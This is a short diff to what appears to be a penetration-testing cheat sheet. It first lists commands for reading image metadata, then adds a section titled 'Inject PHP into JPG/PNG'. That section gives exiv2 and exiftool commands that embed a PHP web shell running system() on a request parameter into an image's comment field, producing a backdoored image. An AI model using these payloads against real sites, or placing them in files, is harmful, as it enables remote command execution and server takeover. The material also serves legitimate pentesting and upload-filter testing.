@@ -7,3 +7,7 @@ exiftool image.jpg
 exif image.jpg
 mediainfo image.jpg
 find . -iname "*.jpg" -exec mediainfo {} \;
+
+Inject PHP into JPG/PNG
+exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpg
+exiftool “-comment<=back.php” back.png
